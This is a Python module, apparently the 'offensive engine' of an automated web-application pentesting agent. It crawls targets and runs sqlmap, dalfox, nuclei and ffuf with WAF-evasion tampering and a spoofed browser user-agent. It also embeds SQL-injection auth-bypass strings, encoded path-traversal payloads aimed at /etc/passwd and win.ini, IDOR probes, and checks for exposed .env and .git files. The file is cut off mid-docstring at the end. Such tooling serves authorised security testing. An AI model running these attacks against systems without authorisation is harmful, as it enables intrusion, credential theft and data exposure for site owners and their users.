"""
Yggdrasil offensive engine.

Active web-application vulnerability testing that goes beyond recon:
  - katana crawl to harvest live endpoints and parameters
  - sqlmap for real SQL injection (batch, non-destructive)
  - dalfox for reflected/DOM XSS
  - nuclei DAST tags for injection-class templates
  - lightweight auth probes (JWT alg-none / weak-secret, IDOR sequential ID)

Every tool degrades gracefully if its binary is missing. All findings are
written through the agent's add_finding() so they appear live in the UI and
in the Apollo report.
"""
import asyncio
import json
import os
import re
import tempfile
from html.parser import HTMLParser
from urllib.parse import urlparse, parse_qs, parse_qsl, urlencode, urljoin, urlunparse

from core.evasion import (
    SQLMAP_TAMPER, BROWSER_USER_AGENT, expand_payloads, looks_waf_blocked,
)

# Curated wordlists first (fast, fetched at build time), full SecLists as fallback.
SECLISTS_DIRS = [
    "/opt/wordlists/raft-medium-directories.txt",
    "/opt/wordlists/common.txt",
    "/opt/seclists/Discovery/Web-Content/raft-medium-directories.txt",
    "/opt/seclists/Discovery/Web-Content/common.txt",
]

# Max number of spider-discovered endpoints we import into ZAP's site tree per
# host so the active scanner covers each URL/parameter katana found, not just the
# root. Kept bounded so seeding does not dwarf the scan itself.
MAX_ZAP_SEED = 200

# Common API / SPA endpoints a JS crawler misses. Single-page apps (Angular/React,
# e.g. OWASP Juice Shop) render routes client-side and keep the real attack surface
# in a REST/GraphQL API that never appears in the page HTML. We probe these directly;
# the parameterized ones give the injection probes actual parameters to attack.
COMMON_ENDPOINTS = [
    # API / SPA roots + docs
    "/api", "/api/v1", "/api/v2", "/rest", "/graphql",
    "/swagger.json", "/openapi.json", "/api-docs", "/v2/api-docs",
    # Common REST resources
    "/api/users", "/api/products", "/api/orders", "/rest/user/whoami",
    "/rest/products/search?q=test",
    # Generic parameterized probes (hand the fuzzers params on the app root)
    "/?q=test", "/?s=test", "/?id=1", "/?search=test",
    "/?file=test", "/?url=http://test", "/?redirect=/test", "/?page=1",
]

# Where OpenAPI / Swagger specs commonly live. A machine-readable spec is the
# richest surface source there is — every path + parameter, no crawling.
SPEC_PATHS = [
    "/openapi.json", "/swagger.json", "/v2/api-docs", "/api-docs",
    "/swagger/v1/swagger.json", "/api/swagger.json", "/api-docs/swagger.json",
    "/openapi.yaml", "/api/openapi.json",
]

# Unlikely-to-collide reflection canary + the shared injection payload set used by
# both the query-param auto-fuzz and the form (POST/body) probe.
XSS_CANARY = "olymxss7z"
INJECT_PAYLOADS = [
    "'", '"', "')", "';",              # SQL / quote syntax breakers
    "1' OR '1'='1", "' OR 1=1-- -",    # SQLi (incl. auth-bypass on login forms)
    f"<{XSS_CANARY}>",                  # unencoded-reflection canary
    "../../../../etc/passwd",          # path traversal
]


class _FormExtractor(HTMLParser):
    """Pull <form> actions/methods and their input/textarea/select field names out
    of an HTML page — the POST/body attack surface a URL crawler never sees."""

    def __init__(self):
        super().__init__()
        self.forms = []
        self._cur = None

    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        if tag == "form":
            self._cur = {"action": a.get("action") or "",
                         "method": (a.get("method") or "get").lower(),
                         "fields": []}
        elif tag in ("input", "textarea", "select") and self._cur is not None:
            name = a.get("name")
            itype = (a.get("type") or "text").lower()
            if name and itype not in ("submit", "button", "image", "reset", "file", "hidden"):
                if name not in self._cur["fields"]:
                    self._cur["fields"].append(name)

    def handle_endtag(self, tag):
        if tag == "form" and self._cur is not None:
            self.forms.append(self._cur)
            self._cur = None


def _host_ok(candidate: str, base: str) -> bool:
    """True when candidate is on the same host as base — keeps form testing in scope."""
    try:
        ch = urlparse(candidate).netloc.lower()
        bh = urlparse(base).netloc.lower()
        return bool(ch) and ch == bh
    except Exception:
        return False

# Static assets to drop from archive parameter discovery: they rarely carry an
# injectable parameter and would only dilute the test pool.
ARCHIVE_SKIP_EXT = (
    ".jpg", ".jpeg", ".png", ".gif", ".svg", ".ico", ".webp", ".bmp",
    ".css", ".js", ".woff", ".woff2", ".ttf", ".eot", ".otf",
    ".mp4", ".webm", ".mp3", ".pdf", ".zip", ".gz", ".tar", ".rar",
)

# Parameter names that commonly carry a redirect target (open-redirect probe).
REDIRECT_PARAMS = {
    "url", "next", "redirect", "redir", "return", "returnurl", "return_url",
    "dest", "destination", "continue", "goto", "go", "r", "u", "link", "out",
    "target", "redirect_uri", "callback", "checkout_url", "forward", "to",
}

# Parameter names that commonly carry a URL the server fetches (SSRF probe).
SSRF_PARAMS = {
    "url", "uri", "path", "dest", "destination", "redirect", "link", "src",
    "source", "target", "host", "site", "domain", "callback", "feed", "file",
    "page", "proxy", "fetch", "load", "image", "img", "open", "to", "out",
    "view", "remote", "api", "endpoint", "data", "reference", "ref",
}

# High-signal candidate names for active parameter mining (arjun style).
PARAM_MINE_CANDIDATES = [
    "id", "page", "file", "dir", "path", "url", "redirect", "next", "q", "s",
    "search", "query", "user", "username", "email", "debug", "test", "admin",
    "cmd", "exec", "action", "view", "include", "template", "lang", "callback",
    "return", "data", "key", "token", "format", "type", "mode", "step", "order",
    "sort", "field", "filter", "start", "limit", "offset", "ref", "source",
    "target", "dest", "preview", "download", "doc", "report", "print", "export",
    "import", "name", "value", "content", "message", "comment", "title", "body",
]


class OffensiveEngine:
    """Mixed into Ares. Expects the host to provide: self.run_command, self.log,
    self.add_finding (all from BaseAgent)."""

    def _candidate_parameter_names(self, urls: list, declared_paths: list = None) -> list:
        """Build a high-signal parameter wordlist from routes and scope hints."""
        declared_paths = declared_paths or []
        names = []

        def add(name):
            clean = re.sub(r"[^A-Za-z0-9_:-]", "", str(name or "")).strip()
            if clean and clean not in names and len(clean) <= 64:
                names.append(clean)

        for u in urls or []:
            parsed = urlparse(str(u))
            for key in parse_qs(parsed.query).keys():
                add(key)
            for segment in parsed.path.split("/"):
                for token in re.split(r"[^A-Za-z0-9]+", segment):
                    if len(token) >= 3:
                        add(token.lower())

        for item in declared_paths:
            if not isinstance(item, dict):
                continue
            path = str(item.get("path") or "")
            for segment in path.split("/"):
                for token in re.split(r"[^A-Za-z0-9]+", segment):
                    if len(token) >= 3:
                        add(token.lower())

            hints = " ".join(str(h) for h in (item.get("hints") or [])).lower()
            if any(term in hints for term in ("sql", "injection")):
                for name in ("searchTerm", "search", "q", "query", "id"):
                    add(name)
            if any(term in hints for term in ("xss", "cross-site", "reflected")):
                for name in ("searchTerm", "search", "q", "callback", "return"):
                    add(name)
            if any(term in hints for term in ("xml", "xxe", "external entity")):
                for name in ("stockApi", "xml", "url", "file", "path"):
                    add(name)
            if any(term in hints for term in ("idor", "bola", "access control", "object")):
                for name in ("id", "userId", "account_id", "orderId", "productId"):
                    add(name)
            if any(term in hints for term in ("ssrf", "server-side request")):
                for name in ("url", "uri", "callback", "stockApi", "endpoint"):
                    add(name)

        for name in (
            "searchTerm", "productId", "stockApi", "xml", "account_id",
            "userId", "orderId", *PARAM_MINE_CANDIDATES,
        ):
            add(name)
        return names

    def _declared_hints_for_route(self, route: str, declared_paths: list) -> list:
        route_path = urlparse(route).path.rstrip("/") or "/"
        hints = []
        for item in declared_paths or []:
            if not isinstance(item, dict):
                continue
            declared_path = str(item.get("path") or "").rstrip("/") or "/"
            if route_path == declared_path or route_path.startswith(declared_path + "/"):
                hints.extend(item.get("hints") or [])
        return hints

    def _prioritized_parameter_names(self, route: str, candidates: list, hints: list) -> list:
        path = urlparse(route).path.lower()
        hint_text = " ".join(str(h) for h in hints).lower()
        priority = []

        def add(name):
            if name not in priority:
                priority.append(name)

        if "catalog" in path:
            for name in ("searchTerm", "productId", "search", "q"):
                add(name)
        if "stock" in path:
            for name in ("stockApi", "productId"):
                add(name)
        if any(term in hint_text for term in ("xml", "xxe", "external entity")):
            for name in ("stockApi", "xml", "url", "file"):
                add(name)
        if any(term in hint_text for term in ("sql", "xss", "cross-site", "reflected")):
            for name in ("searchTerm", "search", "q", "callback", "id"):
                add(name)
        for name in candidates:
            add(name)
        return priority

    def generate_parameter_test_urls(self, base_url: str, routes: list,
                                     declared_paths: list = None,
                                     scope_rules: dict = None,
                                     max_routes: int = 25,
                                     max_urls: int = 200) -> list:
        """Synthesize parameterized URLs for routes that crawlers find without params."""
        from core.web_security import is_url_in_scope

        declared_paths = declared_paths or []
        base = base_url.rstrip("/")
        route_pool = []

        def add_route(route):
            if not route:
                return
            full = str(route)
            if not full.startswith(("http://", "https://")):
                full = urljoin(base + "/", full.lstrip("/"))
            if full not in route_pool:
                route_pool.append(full)

        for route in routes or []:
            add_route(route)
        for item in declared_paths:
            if isinstance(item, dict):
                add_route(item.get("path"))

        out = []
        for route in route_pool[:max_routes]:
            if scope_rules is not None and not is_url_in_scope(route, base_url, scope_rules):
                continue
            parsed = urlparse(route)
            if not parsed.scheme or not parsed.netloc:
                continue
            hints = self._declared_hints_for_route(route, declared_paths)
            candidates = self._candidate_parameter_names([route], declared_paths)
            for name in self._prioritized_parameter_names(route, candidates, hints):
                test_url = urlunparse((
                    parsed.scheme,
                    parsed.netloc,
                    parsed.path or "/",
                    "",
                    urlencode({name: "yggdrasil"}),
                    "",
                ))
                if test_url not in out:
                    out.append(test_url)
                if len(out) >= max_urls:
                    return out
        return out

    # ── Crawl ────────────────────────────────────────────────────
    async def crawl(self, base_url: str, max_urls: int = 200) -> list:
        await self.log(f"Crawling {base_url} for endpoints and parameters (katana)", "info")
        cmd = ["katana", "-u", base_url, "-jc", "-jsl", "-kf", "all", "-aff", "-d", "3",
               "-c", "15", "-silent", "-nc", "-timeout", "10"]
        if self._cookie():
            cmd += ["-H", f"Cookie: {self._cookie()}"]
        stdout, _, rc = await self.run_command(cmd, timeout=180)
        if rc == 127:
            await self.log("katana not available; falling back to seed URL only", "warn")
            return [base_url]

        urls = []
        for line in stdout.splitlines():
            u = line.strip()
            if u.startswith("http"):
                urls.append(u)
        urls = list(dict.fromkeys(urls))[:max_urls]

        param_urls = [u for u in urls if "?" in u and "=" in u]
        await self.log(f"Crawl complete: {len(urls)} URLs, {len(param_urls)} with parameters", "success")
        return urls

    async def seed_endpoints(self, base_url: str) -> list:
        """Probe a curated set of common API/SPA endpoints that JS crawlers miss.

        SPAs (Juice Shop et al.) serve the same index for every route, so a crawl
        finds ~nothing and the app looks clean. We hit the likely API/REST/GraphQL
        paths directly and keep the ones that actually exist, always keeping the
        parameterized probes so the injection tests have parameters to attack.
        Additive to the crawl surface; degrades to [] on any error."""
        import httpx
        base = base_url.rstrip("/")
        found = []
        try:
            async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=True,
                                         headers=self._auth_headers()) as c:
                try:
                    root = await c.get(base + "/")
                    root_len = len(root.content)
                except Exception:
                    root_len = -1

                async def probe(path: str):
                    url = base + path
                    try:
                        r = await c.get(url)
                    except Exception:
                        return None
                    if r.status_code in (400, 404):
                        return None
                    # SPA catch-all: a non-parameterized path whose body matches the
                    # root is just index.html — noise. Parameterized probes are always
                    # kept (the fuzzers need the parameter).
                    if "?" not in path and root_len >= 0 and abs(len(r.content) - root_len) < 32:
                        return None
                    return url

                results = await asyncio.gather(*[probe(p) for p in COMMON_ENDPOINTS],
                                               return_exceptions=True)
            for r in results:
                if isinstance(r, str) and r:
                    found.append(r)
        except Exception as e:
            await self.log(f"Endpoint seeding skipped: {e}", "warn")
            return []
        if found:
            await self.log(f"Seeded {len(found)} common API/SPA endpoint(s) crawlers miss", "info")
        return found

    async def import_api_specs(self, base_url: str) -> list:
        """Discover an OpenAPI/Swagger spec and fold its endpoints into the surface.

        A machine-readable spec hands us every path + parameter with zero crawling —
        the single best surface source for API targets. Scope-safe (endpoints are
        anchored to the target host); degrades to [] when no spec is exposed."""
        from core.surface import endpoints_from_openapi
        import httpx
        base = base_url.rstrip("/")
        try:
            async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=True,
                                         headers=self._auth_headers()) as c:
                for sp in SPEC_PATHS:
                    try:
                        r = await c.get(base + sp)
                    except Exception:
                        continue
                    if r.status_code != 200:
                        continue
                    try:
                        spec = r.json()
                    except Exception:
                        continue
                    eps = endpoints_from_openapi(spec, base_url)
                    if eps:
                        await self.log(f"Imported {len(eps)} endpoints from API spec {sp}", "success")
                        return eps[:500]
        except Exception as e:
            await self.log(f"API spec import skipped: {e}", "warn")
        return []

    # ── Passive parameter discovery (ParamSpider / gau style) ────
    async def gather_archive_urls(self, base_url: str, cap: int = 2500) -> list:
        """Harvest historical URLs and hidden parameters from web archives.

        Queries the Wayback Machine CDX API for every URL ever archived for the
        host and keeps the parameterized ones. These are endpoints/params that
        are no longer linked on the live site, so an active crawler never finds
        them. No traffic hits the target (fully passive)."""
        import httpx

        host = urlparse(base_url).netloc.split(":")[0]
        if not host:
            return []
        await self.log(f"Archive parameter discovery for {host} (Wayback CDX)", "info")

        found = set()
        cdx = ("http://web.archive.org/cdx/search/cdx"
               f"?url={host}/*&output=text&fl=original&collapse=urlkey&limit=15000")
        try:
            async with httpx.AsyncClient(timeout=45, follow_redirects=True) as c:
                r = await c.get(cdx, headers={"User-Agent": "YGGDRASIL-recon/1.0"})
                if r.status_code == 200:
                    for line in r.text.splitlines():
                        u = line.strip()
                        if not u.startswith("http"):
                            continue
                        path = u.lower().split("?", 1)[0]
                        if path.endswith(ARCHIVE_SKIP_EXT):
                            continue
                        found.add(u)
        except Exception as e:
            await self.log(f"Archive discovery failed ({e}); continuing without it", "warn")
            return []

        urls = list(found)
        param_urls = [u for u in urls if "?" in u and "=" in u]
        await self.log(
            f"Archive discovery: {len(urls)} archived URLs, {len(param_urls)} with parameters",
            "success" if param_urls else "info",
        )
        # Parameterized URLs first (highest test value), then the rest, capped.
        ordered = param_urls + [u for u in urls if not ("?" in u and "=" in u)]
        return ordered[:cap]

    def _dedupe_by_params(self, urls: list) -> list:
        """Collapse URLs that hit the same endpoint with the same parameter names
        (e.g. id=1 and id=2 -> one), so each param set is tested once. This is
        what makes archive discovery usable instead of thousands of near-dupes."""
        seen, out = set(), []
        for u in urls:
            p = urlparse(u)
            if "?" in u and "=" in u:
                names = tuple(sorted(parse_qs(p.query, keep_blank_values=True).keys()))
                key = (p.netloc, p.path, names)
            else:
                key = (p.netloc, p.path, ())
            if key in seen:
                continue
            seen.add(key)
            out.append(u)
        return out

    # ── SQL injection ────────────────────────────────────────────
    async def _emit_sqlmap_hits(self, combined: str, tag: str = "") -> list:
        """Parse sqlmap output for confirmed injection points and raise a finding
        for each. Shared by the GET-parameter and form passes."""
        found = []
        vuln_blocks = re.findall(
            r"Parameter:\s*(.+?)\s*\((\w+)\).*?Type:\s*(.+?)\n.*?Title:\s*(.+?)\n",
            combined, re.DOTALL,
        )
        for param, method, sqli_type, title in vuln_blocks:
            found.append({"parameter": param.strip(), "method": method, "type": sqli_type.strip()})
            await self.add_finding(
                title=f"SQL Injection: {param.strip()} ({method}){tag}",
                severity="critical",
                description=f"SQL injection confirmed by sqlmap on parameter '{param.strip()}'. "
                            f"Injection type: {sqli_type.strip()}. An attacker can read or modify "
                            f"the database, extract credentials, and potentially achieve RCE.",
                evidence=f"sqlmap: {title.strip()}\nParameter: {param.strip()} ({method})",
                cvss_score=9.8,
                remediation="Use parameterized queries / prepared statements. Never concatenate "
                            "user input into SQL. Apply least-privilege DB accounts and a WAF.",
            )
        return found

    async def test_sqli(self, base_url: str, urls: list) -> list:
        findings = []
        param_urls = [u for u in urls if "?" in u and "=" in u][:25]

        # (1) GET-parameter SQLi
        if param_urls:
            await self.log(f"Testing {len(param_urls)} endpoints for SQL injection "
                           f"(sqlmap, WAF-evasion tamper: {SQLMAP_TAMPER})", "info")
            with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
                f.write("\n".join(param_urls))
                url_file = f.name
            try:
                sqlmap_cmd = ["sqlmap", "-m", url_file, "--batch",
                              "--user-agent", BROWSER_USER_AGENT, "--tamper", SQLMAP_TAMPER,
                              "--level", "3", "--risk", "2", "--smart",
                              "--technique", "BEUST", "--threads", "4",
                              "--timeout", "15", "--retries", "1",
                              "--output-dir", "/tmp/sqlmap_out"]
                if self._cookie():
                    sqlmap_cmd += ["--cookie", self._cookie()]
                stdout, stderr, rc = await self.run_command(sqlmap_cmd, timeout=600)
                if rc == 127:
                    await self.log("sqlmap not available; SQLi testing skipped", "warn")
                    self._mark_tool_missing("sqli")
                    return findings
                combined = stdout + stderr
                findings += await self._emit_sqlmap_hits(combined)
                if not findings and "is vulnerable" in combined.lower():
                    await self.add_finding(
                        title="Possible SQL Injection (manual confirm)",
                        severity="high",
                        description="sqlmap flagged a potential injection point. Manual confirmation advised.",
                        evidence=combined[-400:],
                        cvss_score=7.5,
                        remediation="Parameterize queries; review flagged endpoint.",
                    )
            except Exception as e:
                await self.log(f"sqlmap error: {e}", "warn")
            finally:
                os.unlink(url_file)
        else:
            await self.log("No parameterized URLs to test for SQLi — trying forms", "info")

        # (2) Form-based SQLi: sqlmap discovers and tests the POST/GET forms it finds
        # (login, search, checkout). This is where auth-bypass SQLi actually lives.
        if base_url:
            await self.log("Testing forms for SQL injection (sqlmap --forms)", "info")
            try:
                forms_cmd = ["sqlmap", "-u", base_url, "--forms", "--crawl=1", "--batch",
                             "--user-agent", BROWSER_USER_AGENT, "--tamper", SQLMAP_TAMPER,
                             "--level", "3", "--risk", "2", "--smart",
                             "--technique", "BEUST", "--threads", "4", "--timeout", "15",
                             "--retries", "1", "--crawl-exclude", "logout|logoff|signout",
                             "--output-dir", "/tmp/sqlmap_out"]
                if self._cookie():
                    forms_cmd += ["--cookie", self._cookie()]
                fstdout, fstderr, frc = await self.run_command(forms_cmd, timeout=600)
                if frc != 127:
                    findings += await self._emit_sqlmap_hits(fstdout + fstderr, " [form]")
            except Exception as e:
                await self.log(f"sqlmap forms error: {e}", "warn")

        await self.log(f"SQLi testing complete: {len(findings)} injection point(s)",
                       "success" if findings else "info")
        return findings

    # ── XSS ──────────────────────────────────────────────────────
    async def test_xss(self, urls: list) -> list:
        param_urls = [u for u in urls if "?" in u and "=" in u][:40]
        if not param_urls:
            await self.log("No parameterized URLs to test for XSS", "info")
            return []

        await self.log(f"Testing {len(param_urls)} endpoints for XSS (dalfox, WAF-evasion)", "info")
        findings = []

        with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
            f.write("\n".join(param_urls))
            url_file = f.name

        try:
            dalfox_cmd = ["dalfox", "file", url_file, "--format", "json",
                          "--silence", "--no-spinner", "--worker", "10", "--timeout", "10",
                          "--user-agent", BROWSER_USER_AGENT, "--waf-evasion",
                          "--deep-domxss", "--mining-dom", "--mining-dict"]
            if self._cookie():
                dalfox_cmd += ["-C", self._cookie()]
            stdout, stderr, rc = await self.run_command(dalfox_cmd, timeout=420)
            if rc == 127:
                await self.log("dalfox not available; XSS testing skipped", "warn")
                self._mark_tool_missing("xss")
                return []

            for line in stdout.splitlines():
                line = line.strip()
                if not line.startswith("{"):
                    continue
                try:
                    hit = json.loads(line)
                    poc = hit.get("data") or hit.get("poc") or ""
                    param = hit.get("param", "unknown")
                    xss_type = hit.get("type", "reflected")
                    severity = "high" if xss_type.lower() != "info" else "info"
                    if severity == "info":
                        continue
                    findings.append({"param": param, "type": xss_type, "poc": poc})
                    await self.add_finding(
                        title=f"Cross-Site Scripting ({xss_type}): {param}",
                        severity="high",
                        description=f"dalfox confirmed {xss_type} XSS on parameter '{param}'. "
                                    "An attacker can execute arbitrary JavaScript in a victim's "
                                    "browser, enabling session theft, credential harvesting, and defacement.",
                        evidence=f"PoC: {poc[:400]}",
                        cvss_score=7.4,
                        remediation="Context-aware output encoding, a strict Content-Security-Policy, "
                                    "and input validation. Escape on output, not just input.",
                    )
                except json.JSONDecodeError:
                    continue

            await self.log(f"XSS testing complete: {len(findings)} confirmed", "success" if findings else "info")
        except Exception as e:
            await self.log(f"dalfox error: {e}", "warn")
        finally:
            os.unlink(url_file)

        return findings

    # ── Nuclei DAST (injection templates) ────────────────────────
    async def nuclei_dast(self, urls: list) -> list:
        seed = [u for u in urls if "?" in u][:50] or urls[:20]
        if not seed:
            return []
        await self.log(f"Running Nuclei DAST injection templates on {len(seed)} URLs", "info")
        findings = []

        with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
            f.write("\n".join(seed))
            uf = f.name

        try:
            nuclei_cmd = ["nuclei", "-l", uf, "-dast", "-jsonl", "-silent",
                          "-severity", "critical,high,medium", "-timeout", "10", "-rl", "50",
                          "-retries", "1"]
            if self._cookie():
                nuclei_cmd += ["-H", f"Cookie: {self._cookie()}"]
            stdout, _, rc = await self.run_command(nuclei_cmd, timeout=420)
            if rc == 127:
                await self.log("nuclei not available for DAST", "warn")
                return []
            for line in stdout.splitlines():
                line = line.strip()
                if not line.startswith("{"):
                    continue
                try:
                    fnd = json.loads(line)
                    info = fnd.get("info", {})
                    sev = info.get("severity", "info").lower()
                    if sev not in ("critical", "high", "medium"):
                        continue
                    cvss = {"critical": 9.5, "high": 7.5, "medium": 5.0}.get(sev, 0)
                    name = info.get("name", fnd.get("template-id", "DAST finding"))
                    matched = fnd.get("matched-at", "")
                    findings.append({"name": name, "severity": sev, "url": matched})
                    await self.add_finding(
                        title=f"[DAST] {name}",
                        severity=sev,
                        description=info.get("description", f"Nuclei DAST matched {name}"),
                        evidence=f"URL: {matched}\nTemplate: {fnd.get('template-id','')}",
                        cvss_score=cvss,
                        remediation=info.get("remediation", "Review and patch the injection point."),
                    )
                except json.JSONDecodeError:
                    continue
            await self.log(f"Nuclei DAST complete: {len(findings)} findings", "success" if findings else "info")
        except Exception as e:
            await self.log(f"Nuclei DAST error: {e}", "warn")
        finally:
            os.unlink(uf)

        return findings

    # ── Auth / JWT / IDOR probes ─────────────────────────────────
    async def test_auth(self, base_url: str, urls: list) -> list:
        import httpx
        findings = []
        await self.log("Probing authentication and access-control weaknesses", "info")

        # JWT exposure + alg-none check on any cookie/header token seen
        # IDOR: look for numeric-id API paths and try id+1 / id-1 unauthenticated
        api_id_urls = []
        for u in urls:
            if re.search(r"/(api|rest)/\w+/\d+", u):
                api_id_urls.append(u)

        async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=True, headers=self._auth_headers()) as c:
            for u in api_id_urls[:15]:
                m = re.search(r"(.*/)(\d+)(\b.*)$", u)
                if not m:
                    continue
                prefix, num, suffix = m.group(1), int(m.group(2)), m.group(3)
                for delta in (1, -1):
                    probe = f"{prefix}{num + delta}{suffix}"
                    try:
                        r = await c.get(probe)
                        if r.status_code == 200 and len(r.content) > 30:
                            findings.append({"type": "idor", "url": probe})
                            _f = await self.add_finding(
                                title=f"Potential IDOR: {probe}",
                                severity="high",
                                description="An object referenced by a sequential ID was accessible without "
                                            "authorization checks. This is a Broken Object Level Authorization "
                                            "(BOLA) flaw allowing access to other users' records.",
                                evidence=f"GET {probe} -> HTTP 200 ({len(r.content)} bytes)",
                                cvss_score=7.5,
                                remediation="Enforce per-object ownership checks server-side on every request. "
                                            "Do not rely on unguessable IDs; use authorization, not obscurity.",
                            )
                            await self.capture(r, finding_id=(_f.id if _f else None),
                                               notes="Sequential object id accessible")
                            break
                    except Exception:
                        continue

        # Exposed sensitive endpoints frequently paying on bounties
        sensitive = ["/.git/config", "/.env", "/actuator/health", "/actuator/env",
                     "/api/swagger.json", "/swagger-ui/", "/graphql", "/server-status",
                     "/.well-known/security.txt", "/debug", "/metrics"]
        async with httpx.AsyncClient(timeout=6, verify=False, follow_redirects=False, headers=self._auth_headers()) as c:
            for path in sensitive:
                try:
                    r = await c.get(base_url.rstrip("/") + path)
                    if r.status_code == 200 and len(r.content) > 20:
                        sev = "high" if path in ("/.env", "/.git/config", "/actuator/env") else "medium"
                        cvss = 7.5 if sev == "high" else 5.3
                        findings.append({"type": "exposure", "path": path})
                        _f = await self.add_finding(
                            title=f"Sensitive Endpoint Exposed: {path}",
                            severity=sev,
                            description=f"{path} is publicly accessible and returned content. "
                                        "This can leak secrets, source, internal config, or API schemas.",
                            evidence=f"GET {path} -> 200 ({len(r.content)} bytes)",
                            cvss_score=cvss,
                            remediation="Restrict or remove the endpoint. Move secrets to env/secret managers "
                                        "and block metadata/debug routes at the edge.",
                        )
                        await self.capture(r, finding_id=(_f.id if _f else None),
                                           notes=f"Sensitive endpoint {path} publicly accessible")
                except Exception:
                    continue

        # GraphQL introspection (common high-value finding)
        try:
            async with httpx.AsyncClient(timeout=8, verify=False, headers=self._auth_headers()) as c:
                q = {"query": "{__schema{types{name}}}"}
                r = await c.post(base_url.rstrip("/") + "/graphql", json=q)
                if r.status_code == 200 and "__schema" in r.text:
                    findings.append({"type": "graphql_introspection"})
                    _f = await self.add_finding(
                        title="GraphQL Introspection Enabled",
                        severity="medium",
                        description="The GraphQL endpoint exposes its full schema via introspection, "
                                    "handing an attacker the complete API surface for targeted abuse.",
                        evidence="POST /graphql with introspection query returned __schema",
                        cvss_score=5.3,
                        remediation="Disable introspection in production and enforce query depth/complexity limits.",
                    )
                    await self.capture(r, finding_id=(_f.id if _f else None),
                                       notes="GraphQL introspection returned __schema")
        except Exception:
            pass

        await self.log(f"Auth/access-control probing complete: {len(findings)} findings", "success" if findings else "info")
        return findings

    # ── Content discovery with a real wordlist ───────────────────
    async def content_discovery(self, base_url: str, extra_wordlists: list = None) -> list:
        # Priority: generated/selected lists passed in, then first existing curated list.
        lists = list(extra_wordlists or [])
        curated = next((w for w in SECLISTS_DIRS if os.path.exists(w)), None)
        if curated and curated not in lists:
            lists.append(curated)
        lists = [w for w in lists if w and os.path.exists(w)]
        if not lists:
            await self.log("No wordlists present; skipping deep content discovery", "warn")
            return []

        await self.log(f"Content discovery with {len(lists)} wordlist(s) (ffuf)", "info")
        found = {}
        for wordlist in lists:
            ffuf_cmd = ["ffuf", "-u", f"{base_url.rstrip('/')}/FUZZ", "-w", wordlist,
                        "-mc", "200,204,301,302,307,401,403,405,500",
                        "-ac", "-recursion", "-recursion-depth", "1",
                        "-e", ".php,.bak,.old,.zip,.json,.txt,.config,.git,.env",
                        "-json", "-s", "-t", "40", "-timeout", "8", "-maxtime", "240"]
            if self._cookie():
                ffuf_cmd += ["-H", f"Cookie: {self._cookie()}"]
            stdout, _, rc = await self.run_command(ffuf_cmd, timeout=300)
            if rc == 127:
                await self.log("ffuf not available; content discovery skipped", "warn")
                self._mark_tool_missing("content")
                return []
            for line in stdout.splitlines():
                try:
                    hit = json.loads(line)
                    url = hit.get("url", "")
                    if url and url not in found:
                        found[url] = {"url": url, "status": hit.get("status", 0)}
                except json.JSONDecodeError:
                    continue
        results = list(found.values())
        await self.log(f"Content discovery: {len(results)} paths", "success" if results else "info")
        return results

    # ── Orchestrate the offensive phase ──────────────────────────
    # ── Path traversal / LFI (active, confirmed file read) ───────
    async def test_path_traversal(self, urls: list) -> list:
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        import httpx

        param_urls = [u for u in urls if "?" in u and "=" in u][:30]
        if not param_urls:
            await self.log("No parameterized URLs to test for path traversal", "info")
            return []

        await self.log(f"Testing {len(param_urls)} endpoints for path traversal / LFI", "info")

        NIX = "etc/passwd"
        WIN = "windows/win.ini"
        depths = ["../", "../../", "../../../", "../../../../",
                  "../../../../../", "../../../../../../", "../../../../../../../"]
        payloads = []
        for d in depths:
            payloads.append(d + NIX)
            payloads.append(d + WIN)
        payloads += [
            "/etc/passwd",
            "....//....//....//....//etc/passwd",
            "..%2f..%2f..%2f..%2fetc%2fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "../../../../etc/passwd%00",
        ]

        passwd_re = re.compile(r"root:.*?:0:0:", re.MULTILINE)
        win_re = re.compile(r"\[(extensions|fonts|mci extensions)\]", re.IGNORECASE)

        findings = []
        seen = set()
        budget = 350

        async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=True, headers=self._auth_headers()) as c:
            for u in param_urls:
                parsed = urlparse(u)
                params = parse_qs(parsed.query, keep_blank_values=True)
                for pname in list(params.keys())[:3]:
                    key = (parsed.netloc, parsed.path, pname)
                    if key in seen:
                        continue
                    seen.add(key)
                    hit = None
                    for pl in payloads:
                        if budget <= 0:
                            break
                        budget -= 1
                        mutated = dict(params)
                        mutated[pname] = [pl]
                        target = urlunparse(parsed._replace(query=urlencode(mutated, doseq=True)))
                        try:
                            r = await c.get(target)
                        except Exception:
                            continue
                        body = r.text or ""
                        m = passwd_re.search(body)
                        if m:
                            hit = ("*nix /etc/passwd", pl, "critical", 9.1, m.group(0))
                            break
                        if "win.ini" in pl.lower():
                            wm = win_re.search(body)
                            if wm:
                                hit = ("Windows win.ini", pl, "high", 7.5, wm.group(0))
                                break
                    if hit:
                        label, pl, sev, cvss, snippet = hit
                        findings.append({"param": pname, "payload": pl, "url": u, "file": label})
                        _f = await self.add_finding(
                            title=f"Path Traversal / LFI: {pname}",
                            severity=sev,
                            description=(f"Parameter '{pname}' is vulnerable to path traversal. Injecting a "
                                         f"traversal sequence returned the contents of a protected system "
                                         f"file ({label}), confirming arbitrary file read."),
                            evidence=f"URL: {u}\nParameter: {pname}\nPayload: {pl}\nLeaked: {snippet[:200]}",
                            cvss_score=cvss,
                            remediation=("Reject path separators and traversal sequences in file parameters. "
                                         "Resolve the canonical path and confirm it stays within an allowed "
                                         "base directory. Prefer an allowlist of identifiers mapped "
                                         "server-side to filenames."),
                        )
                        await self.capture(r, finding_id=(_f.id if _f else None),
                                           notes=f"Confirmed path traversal on parameter '{pname}' ({label})")
                    if budget <= 0:
                        await self.log("Path traversal request budget reached; stopping early", "warn")
                        break

        await self.log(f"Path traversal testing complete: {len(findings)} confirmed",
                       "success" if findings else "info")
        return findings

    # ── Generic single-parameter probe ───────────────────────────
    async def _param_probe(self, urls, payloads, detector, name_filter=None,
                           cap=30, per_params=3, follow=True, budget=600) -> list:
        """For each parameterized URL, replace one parameter at a time with each
